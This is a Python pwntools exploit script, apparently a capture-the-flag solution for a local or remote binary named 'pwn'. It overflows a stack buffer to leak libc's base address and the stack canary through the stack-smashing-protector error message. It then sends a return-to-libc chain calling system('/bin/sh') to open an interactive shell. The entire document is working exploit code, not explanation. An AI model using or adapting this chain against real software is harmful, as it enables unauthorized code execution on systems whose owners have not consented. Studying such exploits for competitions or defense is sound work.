from pwn import *

context.arch = "amd64"
context.log_level = "debug"

LOCAL = 1
FILENAME = "./pwn"

if (LOCAL):
	io = process(FILENAME)
else:
	io = remote("127.0.0.1", 4321)

elf = ELF(FILENAME)

if (LOCAL):
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	libc = ELF("./libc.so.6")

def getpid():
	log.info("pid:%d" % io.proc.pid)
	pause()

payload_leak = flat([
    "A"*0x118,
    elf.got["gets"],
])

io.sendline(payload_leak)

io.recvuntil("detected ***: ")
libc_base = u64(io.recvuntil(" terminated",drop=True).ljust(8, b"\x00"))-libc.symbols["gets"]
log.info("[+]libc_base: "+hex(libc_base))
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
#0x0000000000400763 : pop rdi ; ret
pop_rdi_ret = 0x400763
env_addr = libc_base + 0x5d6728 + 1 #0x5ed728 + 1 # +1 skip the '\x00' of canary
#env_addr = libc_base + libc.symbols["_environ"]
payload_canary = flat([
    "A"*0x118,
    env_addr,
])

io.sendline(payload_canary)
io.recvuntil("detected ***: ")
canary = u64(io.recv(7).rjust(8,b"\x00"))
log.info("[+]canary: "+hex(canary))

getpid()

payload_getshell = flat([
    "A"*(0x30-8),
    canary,
    "B"*8,
    pop_rdi_ret,
    binsh_addr,
    system_addr
])

#getpid()

io.sendline(payload_getshell)
io.interactive()
